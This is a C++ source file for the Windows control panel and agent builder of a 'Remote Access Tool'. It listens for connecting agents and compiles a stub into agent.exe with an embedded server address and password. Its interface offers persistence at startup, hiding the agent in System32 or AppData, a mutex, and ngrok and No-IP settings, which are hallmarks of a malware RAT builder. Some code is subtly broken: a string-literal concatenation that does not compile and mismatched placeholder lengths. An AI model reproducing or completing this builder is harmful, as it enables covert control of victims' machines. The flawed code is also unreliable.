#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <thread>
#include <map>
#include <mutex>
#include <winsock2.h>
#include <windows.h>
#include <commctrl.h>
#include <shellapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Comctl32.lib")

#define TCP_PORT 9999
#define UDP_PORT 8888
#define STUB_FILE "stub.cpp"
#define TEMP_AGENT_FILE "temp_agent.cpp"
#define AGENT_EXE "agent.exe"

std::map<std::string, SOCKET> clients;
std::mutex clientsMutex;
SOCKET tcpServerSocket = INVALID_SOCKET;
SOCKET udpServerSocket = INVALID_SOCKET;
HWND clientList, statusLabel, terminalOutput;
HWND serverIpInput, serverPortInput, agentIpInput, agentPortInput, passwordInput;
HWND startOnStartupCheckbox, hideInComboBox, mutexInput, startButton, stopButton, buildButton;
HWND ngrokTokenInput, noipUsernameInput, noipPasswordInput, noipHostnameInput;

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
void logMessage(const std::string& message, COLORREF color);
void updateClientList();
void handleTCPClient(SOCKET clientSocket);
void handleUDPClient(SOCKET clientSocket);
void startTCPServer(std::string ip, int port);
void startUDPServer(std::string ip, int port);
void buildAgent(const std::string& ip, int port, const std::string& password);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WNDCLASS wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "MainWindowClass";
    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(
        0,                              // Optional window styles.
        "MainWindowClass",              // Window class
        "Remote Access Tool",           // Window text
        WS_OVERLAPPEDWINDOW,            // Window style

        // Size and position
        CW_USEDEFAULT, CW_USEDEFAULT, 800, 800,

        NULL,       // Parent window
        NULL,       // Menu
        hInstance,  // Instance handle
        NULL        // Additional application data
    );

    if (hwnd == NULL) {
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            CreateWindowW(L"Static", L"Server IP:", WS_VISIBLE | WS_CHILD, 10, 10, 100, 20, hwnd, NULL, NULL, NULL);
            serverIpInput = CreateWindowW(L"Edit", L"127.0.0.1", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 10, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Server Port:", WS_VISIBLE | WS_CHILD, 10, 40, 100, 20, hwnd, NULL, NULL, NULL);
            serverPortInput = CreateWindowW(L"Edit", L"9999", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 40, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Agent IP:", WS_VISIBLE | WS_CHILD, 10, 70, 100, 20, hwnd, NULL, NULL, NULL);
            agentIpInput = CreateWindowW(L"Edit", L"127.0.0.1", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 70, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Agent Port:", WS_VISIBLE | WS_CHILD, 10, 100, 100, 20, hwnd, NULL, NULL, NULL);
            agentPortInput = CreateWindowW(L"Edit", L"9999", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 100, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Password:", WS_VISIBLE | WS_CHILD, 10, 130, 100, 20, hwnd, NULL, NULL, NULL);
            passwordInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD, 110, 130, 150, 20, hwnd, NULL, NULL, NULL);

            startOnStartupCheckbox = CreateWindowW(L"Button", L"Start on Startup", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX, 10, 160, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Hide In:", WS_VISIBLE | WS_CHILD, 10, 190, 100, 20, hwnd, NULL, NULL, NULL);
            hideInComboBox = CreateWindowW(L"ComboBox", NULL, WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST, 110, 190, 150, 20, hwnd, NULL, NULL, NULL);
            SendMessage(hideInComboBox, CB_ADDSTRING, 0, (LPARAM)L"AppData");
            SendMessage(hideInComboBox, CB_ADDSTRING, 0, (LPARAM)L"Program Files");
            SendMessage(hideInComboBox, CB_ADDSTRING, 0, (LPARAM)L"System32");
            SendMessage(hideInComboBox, CB_SETCURSEL, 0, 0);

            CreateWindowW(L"Static", L"Mutex:", WS_VISIBLE | WS_CHILD, 10, 220, 100, 20, hwnd, NULL, NULL, NULL);
            mutexInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 220, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"ngrok Token:", WS_VISIBLE | WS_CHILD, 10, 250, 100, 20, hwnd, NULL, NULL, NULL);
            ngrokTokenInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 250, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"No-IP Username:", WS_VISIBLE | WS_CHILD, 10, 280, 100, 20, hwnd, NULL, NULL, NULL);
            noipUsernameInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 280, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"No-IP Password:", WS_VISIBLE | WS_CHILD, 10, 310, 100, 20, hwnd, NULL, NULL, NULL);
            noipPasswordInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD, 110, 310, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"No-IP Hostname:", WS_VISIBLE | WS_CHILD, 10, 340, 100, 20, hwnd, NULL, NULL, NULL);
            noipHostnameInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 340, 150, 20, hwnd, NULL, NULL, NULL);

            startButton = CreateWindowW(L"Button", L"Start Server", WS_VISIBLE | WS_CHILD, 10, 370, 120, 30, hwnd, (HMENU)1, NULL, NULL);
            stopButton = CreateWindowW(L"Button", L"Stop Server", WS_VISIBLE | WS_CHILD, 140, 370, 120, 30, hwnd, (HMENU)2, NULL, NULL);
            buildButton = CreateWindowW(L"Button", L"Build Agent", WS_VISIBLE | WS_CHILD, 270, 370, 120, 30, hwnd, (HMENU)3, NULL, NULL);

            clientList = CreateWindowW(L"ListBox", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | LBS_NOTIFY, 270, 10, 200, 350, hwnd, NULL, NULL, NULL);
            terminalOutput = CreateWindowW(L"RichEdit20W", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | ES_MULTILINE | ES_READONLY, 480, 10, 300, 390, hwnd, NULL, NULL, NULL);
            
            LoadLibrary("Msftedit.dll");
            break;
        }
        case WM_COMMAND: {
            if (LOWORD(wParam) == 1) {
                char serverIp[64];
                GetWindowTextA(serverIpInput, serverIp, sizeof(serverIp));
                char serverPort[64];
                GetWindowTextA(serverPortInput, serverPort, sizeof(serverPort));
                std::thread(startTCPServer, std::string(serverIp), atoi(serverPort)).detach();
            } else if (LOWORD(wParam) == 2) {
                if (tcpServerSocket != INVALID_SOCKET) {
                    closesocket(tcpServerSocket);
                    tcpServerSocket = INVALID_SOCKET;
                }
            } else if (LOWORD(wParam) == 3) {
                char agentIp[64];
                GetWindowTextA(agentIpInput, agentIp, sizeof(agentIp));
                char agentPort[64];
                GetWindowTextA(agentPortInput, agentPort, sizeof(agentPort));
                char password[64];
                GetWindowTextA(passwordInput, password, sizeof(password));
                buildAgent(agentIp, atoi(agentPort), password);
            }
            break;
        }
        case WM_DESTROY: {
            if (tcpServerSocket != INVALID_SOCKET) {
                closesocket(tcpServerSocket);
            }
            if (udpServerSocket != INVALID_SOCKET) {
                closesocket(udpServerSocket);
            }
            WSACleanup();
            PostQuitMessage(0);
            break;
        }
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

void logMessage(const std::string& message, COLORREF color) {
    CHARRANGE cr;
    cr.cpMin = -1;
    cr.cpMax = -1;
    SendMessage(terminalOutput, EM_EXSETSEL, 0, (LPARAM)&cr);
    CHARFORMAT cf;
    cf.cbSize = sizeof(cf);
    cf.dwMask = CFM_COLOR;
    cf.crTextColor = color;
    cf.dwEffects = 0;
    SendMessage(terminalOutput, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);
    SendMessage(terminalOutput, EM_REPLACESEL, FALSE, (LPARAM)message.c_str());
}

void updateClientList() {
    SendMessage(clientList, LB_RESETCONTENT, 0, 0);
    clientsMutex.lock();
    for (const auto& client : clients) {
        SendMessage(clientList, LB_ADDSTRING, 0, (LPARAM)client.first.c_str());
    }
    clientsMutex.unlock();
}

void handleTCPClient(SOCKET clientSocket) {
    char buffer[512];
    int result;
    while ((result = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
        buffer[result] = '\0';
        logMessage(buffer, RGB(0, 255, 0));
    }
    closesocket(clientSocket);
}

void handleUDPClient(SOCKET clientSocket) {
    char buffer[512];
    sockaddr_in clientAddr;
    int clientAddrLen = sizeof(clientAddr);
    int result;
    while ((result = recvfrom(clientSocket, buffer, sizeof(buffer), 0, (sockaddr*)&clientAddr, &clientAddrLen)) > 0) {
        buffer[result] = '\0';
        logMessage(buffer, RGB(0, 255, 0));
    }
}

void startTCPServer(std::string ip, int port) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    tcpServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());
    serverAddr.sin_port = htons(port);
    bind(tcpServerSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(tcpServerSocket, SOMAXCONN);
    logMessage("TCP Server started\n", RGB(0, 255, 0));

    while (tcpServerSocket != INVALID_SOCKET) {
        SOCKET clientSocket = accept(tcpServerSocket, NULL, NULL);
        clientsMutex.lock();
        clients[inet_ntoa(serverAddr.sin_addr)] = clientSocket;
        clientsMutex.unlock();
        updateClientList();
        std::thread(handleTCPClient, clientSocket).detach();
    }
}

void startUDPServer(std::string ip, int port) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    udpServerSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());
    serverAddr.sin_port = htons(port);
    bind(udpServerSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    logMessage("UDP Server started\n", RGB(0, 255, 0));

    std::thread(handleUDPClient, udpServerSocket).detach();
}

void buildAgent(const std::string& ip, int port, const std::string& password) {
    std::ifstream stubFile(STUB_FILE);
    std::stringstream buffer;
    buffer << stubFile.rdbuf();
    stubFile.close();

    std::string agentCode = buffer.str();
    size_t pos;

    pos = agentCode.find("%%SERVER_IP%%");
    if (pos != std::string::npos) {
        agentCode.replace(pos, 13, ip);
    }

    pos = agentCode.find("%%SERVER_PORT%%");
    if (pos != std::string::npos) {
        agentCode.replace(pos, 14, std::to_string(port));
    }

    pos = agentCode.find("%%PASSWORD%%");
    if (pos != std::string::npos) {
        agentCode.replace(pos, 11, password);
    }

    // Write modified agent code to a temporary file
    std::ofstream tempAgentFile(TEMP_AGENT_FILE);
    tempAgentFile << agentCode;
    tempAgentFile.close();

    // Compile the temporary agent file
    std::string compileCommand = "g++ " + TEMP_AGENT_FILE + " -o " + AGENT_EXE;
    int compileResult = system(compileCommand.c_str());

    // Check if compilation was successful
    if (compileResult == 0) {
        logMessage("Agent built successfully\n", RGB(0, 255, 0));
    } else {
        logMessage("Failed to build agent\n", RGB(255, 0, 0));
    }

    // Remove the temporary agent file
    remove(TEMP_AGENT_FILE);
}
